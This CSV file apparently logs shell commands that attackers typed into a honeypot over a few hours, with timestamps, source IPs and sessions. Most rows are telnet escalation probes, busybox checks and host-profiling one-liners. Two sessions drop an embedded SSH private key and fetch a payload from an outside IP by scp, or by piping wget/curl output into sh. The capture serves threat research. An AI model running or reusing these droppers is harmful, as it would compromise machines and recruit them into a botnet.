timestamp,src_ip,session,input,failed
2026-08-31 23:56:04.781151+00:00,153.117.8.44,e9b84761b074,system,False
2026-08-31 23:56:04.782193+00:00,153.117.8.44,e9b84761b074,system ,True
2026-08-31 23:56:04.783449+00:00,153.117.8.44,e9b84761b074,linuxshell,False
2026-08-31 23:56:04.784263+00:00,153.117.8.44,e9b84761b074,linuxshell ,True
2026-08-31 23:56:04.785189+00:00,153.117.8.44,e9b84761b074,su,False
2026-08-31 23:56:04.786835+00:00,153.117.8.44,e9b84761b074,shell,False
2026-08-31 23:56:04.787815+00:00,153.117.8.44,e9b84761b074,shell ,True
2026-08-31 23:56:04.788660+00:00,153.117.8.44,e9b84761b074,sh,False
2026-08-31 23:56:04.798542+00:00,153.117.8.44,e9b84761b074,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x4d\x54\x4e\x50\x4a\x59',False
2026-08-31 23:56:04.806599+00:00,153.117.8.44,e9b84761b074,/bin/busybox echo -e \x4d\x54\x4e\x50\x4a\x59,True
2026-09-01 00:06:28.188346+00:00,103.243.27.13,80fd33fede7b,id,False
2026-09-01 00:06:28.193244+00:00,103.243.27.13,80fd33fede7b,cat /etc/passwd,False
2026-09-01 00:06:28.203525+00:00,103.243.27.13,80fd33fede7b,"echo -e ""\x61\x75\x74\x68\x5F\x6F\x6B\x0A""",False
2026-09-01 00:06:28.470520+00:00,103.243.27.13,80fd33fede7b,enable,False
2026-09-01 00:06:28.472195+00:00,103.243.27.13,80fd33fede7b,enable ,True
2026-09-01 00:06:28.473804+00:00,103.243.27.13,80fd33fede7b,system,False
2026-09-01 00:06:28.475042+00:00,103.243.27.13,80fd33fede7b,system ,True
2026-09-01 00:06:28.476348+00:00,103.243.27.13,80fd33fede7b,shell,False
2026-09-01 00:06:28.477448+00:00,103.243.27.13,80fd33fede7b,shell ,True
2026-09-01 00:06:28.478450+00:00,103.243.27.13,80fd33fede7b,sh,False
2026-09-01 00:06:28.481017+00:00,103.243.27.13,80fd33fede7b,bash,False
2026-09-01 00:06:28.489129+00:00,103.243.27.13,80fd33fede7b,cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----,False
2026-09-01 00:06:28.495215+00:00,103.243.27.13,80fd33fede7b,b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW,False
2026-09-01 00:06:28.496703+00:00,103.243.27.13,80fd33fede7b,b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW ,True
2026-09-01 00:06:28.501932+00:00,103.243.27.13,80fd33fede7b,QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ,False
2026-09-01 00:06:28.503435+00:00,103.243.27.13,80fd33fede7b,QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ ,True
2026-09-01 00:06:28.507938+00:00,103.243.27.13,80fd33fede7b,0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg,False
2026-09-01 00:06:28.509331+00:00,103.243.27.13,80fd33fede7b,0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg ,True
2026-09-01 00:06:28.513631+00:00,103.243.27.13,80fd33fede7b,AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9,False
2026-09-01 00:06:28.514874+00:00,103.243.27.13,80fd33fede7b,AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9 ,True
2026-09-01 00:06:28.517423+00:00,103.243.27.13,80fd33fede7b,Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=,False
2026-09-01 00:06:28.523078+00:00,103.243.27.13,80fd33fede7b,-----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no,False
2026-09-01 00:06:28.524961+00:00,103.243.27.13,80fd33fede7b,-----END OPENSSH PRIVATE KEY----- > key.ppk; echo StrictHostKeyChecking no,True
2026-09-01 00:06:28.550542+00:00,103.243.27.13,80fd33fede7b,"UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e ""\x72\x65\x64\x74\x61\x69\x6C\x5F\x62\x6F\x74\x5F\x74\x65\x6C\x6E\x65\x74\x5F\x6F\x6B""",False
2026-09-01 00:06:28.552738+00:00,103.243.27.13,80fd33fede7b,,False
2026-09-01 00:55:55.390980+00:00,77.239.124.176,1f6cee3d24d1,uname -s -v -n -r -m,False
2026-09-01 01:01:01.868476+00:00,77.239.124.176,759a86ab384b,uname -s -v -n -r -m,False
2026-09-01 01:08:43.609508+00:00,103.179.240.183,c371b2499caa,start,False
2026-09-01 01:08:43.610653+00:00,103.179.240.183,c371b2499caa,start ,True
2026-09-01 01:08:43.611700+00:00,103.179.240.183,c371b2499caa,enable,False
2026-09-01 01:08:43.612602+00:00,103.179.240.183,c371b2499caa,enable ,True
2026-09-01 01:08:43.614106+00:00,103.179.240.183,c371b2499caa,config terminal,False
2026-09-01 01:08:43.615031+00:00,103.179.240.183,c371b2499caa,config terminal,True
2026-09-01 01:08:43.616060+00:00,103.179.240.183,c371b2499caa,system,False
2026-09-01 01:08:43.616962+00:00,103.179.240.183,c371b2499caa,system ,True
2026-09-01 01:08:43.618114+00:00,103.179.240.183,c371b2499caa,linuxshell,False
2026-09-01 01:08:43.618980+00:00,103.179.240.183,c371b2499caa,linuxshell ,True
2026-09-01 01:08:43.619742+00:00,103.179.240.183,c371b2499caa,su,False
2026-09-01 01:08:43.621217+00:00,103.179.240.183,c371b2499caa,shell,False
2026-09-01 01:08:43.621990+00:00,103.179.240.183,c371b2499caa,shell ,True
2026-09-01 01:08:43.622700+00:00,103.179.240.183,c371b2499caa,sh,False
2026-09-01 01:08:43.633785+00:00,103.179.240.183,c371b2499caa,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x56\x5a\x4e\x43\x41\x58',False
2026-09-01 01:08:43.639193+00:00,103.179.240.183,c371b2499caa,/bin/busybox echo -e \x56\x5a\x4e\x43\x41\x58,True
2026-09-01 01:14:57.498892+00:00,77.239.124.176,b47dc616ba50,uname -s -v -n -r -m,False
2026-09-01 01:28:36.705270+00:00,204.168.249.9,d8b8c8b1f2cc,hostname,False
2026-09-01 01:32:23.159762+00:00,204.168.249.9,60e1cb3afdcd,history | tail -5,False
2026-09-01 02:08:19.741537+00:00,92.118.39.71,04c44800ae56,"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '""' ) || echo """"); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q ""lm"" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q ""CPU architecture: 8"" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q ""CPU architecture: 7"" /proc/cpuinfo && echo armv7l ) || echo """"); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c ""^processor"" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E ""^model name"" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E ""^Hardware"" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'execute_err='; out=$(bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf ""#!/bin/sh\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf ""#!/bin/sh\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' ""$out"" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; echo '===DONE===' ) 2>&1 ); echo ""UNAME:$uname""; echo ""ARCH:$arch""; echo ""UPTIME:$uptime""; echo ""CPUS:$cpus""; echo ""CPU_MODEL:$cpu_model""; echo ""GPU:$gpu_info""; echo ""LAST:$last_output""; echo ""FILTER:$filter_output""",False
2026-09-01 02:08:19.747334+00:00,92.118.39.71,04c44800ae56,uname -s -v -n -m 2 > /dev/null,False
2026-09-01 02:08:19.751393+00:00,92.118.39.71,04c44800ae56,/bin/uname -s -v -n -m 2 > /dev/null,False
2026-09-01 02:08:19.752625+00:00,92.118.39.71,04c44800ae56,/usr/bin/uname -s -v -n -m 2 > /dev/null,False
2026-09-01 02:08:19.769504+00:00,92.118.39.71,04c44800ae56,busybox uname -s -v -n -m 2 > /dev/null,False
2026-09-01 02:08:19.770698+00:00,92.118.39.71,04c44800ae56,busybox uname -s -v -n -m,True
2026-09-01 02:08:19.772905+00:00,92.118.39.71,04c44800ae56,( [ -f /proc/version ],False
2026-09-01 02:08:19.773542+00:00,92.118.39.71,04c44800ae56,[ -f /proc/version ],False
2026-09-01 02:08:19.775473+00:00,92.118.39.71,04c44800ae56,head -1 /proc/version | cut -d -f1,False
2026-09-01 02:08:19.789426+00:00,92.118.39.71,04c44800ae56,[ -f /etc/os-release ],False
2026-09-01 02:33:44.700628+00:00,72.255.37.12,ae3115a53276,start,False
2026-09-01 02:33:44.702080+00:00,72.255.37.12,ae3115a53276,start ,True
2026-09-01 02:33:44.703242+00:00,72.255.37.12,ae3115a53276,enable,False
2026-09-01 02:33:44.704117+00:00,72.255.37.12,ae3115a53276,enable ,True
2026-09-01 02:33:44.705698+00:00,72.255.37.12,ae3115a53276,config terminal,False
2026-09-01 02:33:44.706639+00:00,72.255.37.12,ae3115a53276,config terminal,True
2026-09-01 02:33:44.707609+00:00,72.255.37.12,ae3115a53276,system,False
2026-09-01 02:33:44.708476+00:00,72.255.37.12,ae3115a53276,system ,True
2026-09-01 02:33:44.709727+00:00,72.255.37.12,ae3115a53276,linuxshell,False
2026-09-01 02:33:44.710576+00:00,72.255.37.12,ae3115a53276,linuxshell ,True
2026-09-01 02:33:44.711620+00:00,72.255.37.12,ae3115a53276,su,False
2026-09-01 02:33:44.714256+00:00,72.255.37.12,ae3115a53276,shell,False
2026-09-01 02:33:44.715100+00:00,72.255.37.12,ae3115a53276,shell ,True
2026-09-01 02:33:44.715842+00:00,72.255.37.12,ae3115a53276,sh,False
2026-09-01 02:33:44.727242+00:00,72.255.37.12,ae3115a53276,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x41\x5a\x49\x58\x4f\x4f',False
2026-09-01 02:33:44.732703+00:00,72.255.37.12,ae3115a53276,/bin/busybox echo -e \x41\x5a\x49\x58\x4f\x4f,True
2026-09-01 04:08:41.770033+00:00,195.178.110.232,6d13d074842a,"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '""' ) || echo """"); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q ""lm"" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q ""CPU architecture: 8"" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q ""CPU architecture: 7"" /proc/cpuinfo && echo armv7l ) || echo """"); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c ""^processor"" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E ""^model name"" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E ""^Hardware"" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'execute_err='; out=$(bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf ""#!/bin/sh\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf ""#!/bin/sh\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' ""$out"" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; echo '===DONE===' ) 2>&1 ); echo ""UNAME:$uname""; echo ""ARCH:$arch""; echo ""UPTIME:$uptime""; echo ""CPUS:$cpus""; echo ""CPU_MODEL:$cpu_model""; echo ""GPU:$gpu_info""; echo ""LAST:$last_output""; echo ""FILTER:$filter_output""",False
2026-09-01 04:08:41.772236+00:00,195.178.110.232,6d13d074842a,uname -s -v -n -m 2 > /dev/null,False
2026-09-01 04:08:41.773804+00:00,195.178.110.232,6d13d074842a,/bin/uname -s -v -n -m 2 > /dev/null,False
2026-09-01 04:08:41.775271+00:00,195.178.110.232,6d13d074842a,/usr/bin/uname -s -v -n -m 2 > /dev/null,False
2026-09-01 04:08:41.779784+00:00,195.178.110.232,6d13d074842a,busybox uname -s -v -n -m 2 > /dev/null,False
2026-09-01 04:08:41.780916+00:00,195.178.110.232,6d13d074842a,busybox uname -s -v -n -m,True
2026-09-01 04:08:41.782434+00:00,195.178.110.232,6d13d074842a,( [ -f /proc/version ],False
2026-09-01 04:08:41.783410+00:00,195.178.110.232,6d13d074842a,[ -f /proc/version ],False
2026-09-01 04:08:41.786062+00:00,195.178.110.232,6d13d074842a,head -1 /proc/version | cut -d -f1,False
2026-09-01 04:08:41.788258+00:00,195.178.110.232,6d13d074842a,[ -f /etc/os-release ],False
2026-09-01 04:29:42.638948+00:00,57.154.5.249,5a76c669b532,hostname,False
2026-09-01 04:29:43.385869+00:00,57.154.5.249,5a76c669b532,free -m | awk '/Mem:/ {print $2}',False
2026-09-01 04:29:44.045378+00:00,57.154.5.249,5a76c669b532,"cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '""'",False
2026-09-01 04:29:44.574778+00:00,57.154.5.249,5a76c669b532,nproc,False
2026-09-01 05:31:00.850896+00:00,223.123.73.119,a8264ba5caa7,start,False
2026-09-01 05:31:00.852269+00:00,223.123.73.119,a8264ba5caa7,start ,True
2026-09-01 05:31:00.853330+00:00,223.123.73.119,a8264ba5caa7,enable,False
2026-09-01 05:31:00.854299+00:00,223.123.73.119,a8264ba5caa7,enable ,True
2026-09-01 05:31:00.855572+00:00,223.123.73.119,a8264ba5caa7,config terminal,False
2026-09-01 05:31:00.856450+00:00,223.123.73.119,a8264ba5caa7,config terminal,True
2026-09-01 05:31:00.857540+00:00,223.123.73.119,a8264ba5caa7,system,False
2026-09-01 05:31:00.858392+00:00,223.123.73.119,a8264ba5caa7,system ,True
2026-09-01 05:31:00.859587+00:00,223.123.73.119,a8264ba5caa7,linuxshell,False
2026-09-01 05:31:00.860548+00:00,223.123.73.119,a8264ba5caa7,linuxshell ,True
2026-09-01 05:31:00.861301+00:00,223.123.73.119,a8264ba5caa7,su,False
2026-09-01 05:31:00.862909+00:00,223.123.73.119,a8264ba5caa7,shell,False
2026-09-01 05:31:00.863722+00:00,223.123.73.119,a8264ba5caa7,shell ,True
2026-09-01 05:31:00.864355+00:00,223.123.73.119,a8264ba5caa7,sh,False
2026-09-01 05:31:00.875953+00:00,223.123.73.119,a8264ba5caa7,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x59\x58\x4e\x4f\x54\x4b',False
2026-09-01 05:31:00.891778+00:00,223.123.73.119,a8264ba5caa7,/bin/busybox echo -e \x59\x58\x4e\x4f\x54\x4b,True
2026-09-01 05:46:52.898035+00:00,103.74.20.86,0b3c0761f688,start,False
2026-09-01 05:46:52.899005+00:00,103.74.20.86,0b3c0761f688,start ,True
2026-09-01 05:46:52.899961+00:00,103.74.20.86,0b3c0761f688,enable,False
2026-09-01 05:46:52.900681+00:00,103.74.20.86,0b3c0761f688,enable ,True
2026-09-01 05:46:52.901922+00:00,103.74.20.86,0b3c0761f688,config terminal,False
2026-09-01 05:46:52.902927+00:00,103.74.20.86,0b3c0761f688,config terminal,True
2026-09-01 05:46:52.903977+00:00,103.74.20.86,0b3c0761f688,system,False
2026-09-01 05:46:52.905066+00:00,103.74.20.86,0b3c0761f688,system ,True
2026-09-01 05:46:52.906274+00:00,103.74.20.86,0b3c0761f688,linuxshell,False
2026-09-01 05:46:52.907297+00:00,103.74.20.86,0b3c0761f688,linuxshell ,True
2026-09-01 05:46:52.908313+00:00,103.74.20.86,0b3c0761f688,su,False
2026-09-01 05:46:52.909769+00:00,103.74.20.86,0b3c0761f688,shell,False
2026-09-01 05:46:52.910561+00:00,103.74.20.86,0b3c0761f688,shell ,True
2026-09-01 05:46:52.911239+00:00,103.74.20.86,0b3c0761f688,sh,False
2026-09-01 05:46:52.921604+00:00,103.74.20.86,0b3c0761f688,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x45\x4d\x4a\x48\x47\x4d',False
2026-09-01 05:46:52.925686+00:00,103.74.20.86,0b3c0761f688,/bin/busybox echo -e \x45\x4d\x4a\x48\x47\x4d,True
2026-09-01 05:48:33.365774+00:00,130.12.180.51,5b04d8e5a47f,"uname -a; echo -e ""\x61\x75\x74\x68\x5F\x6F\x6B\x0A""; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no; UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s ssh; fi; rm -rf sshcfg key.ppk out_sh",False
2026-09-01 05:48:33.381998+00:00,130.12.180.51,5b04d8e5a47f,if [ 0 -eq 0 ],True
2026-09-01 05:48:33.383454+00:00,130.12.180.51,5b04d8e5a47f,then chmod +x out_sh,True
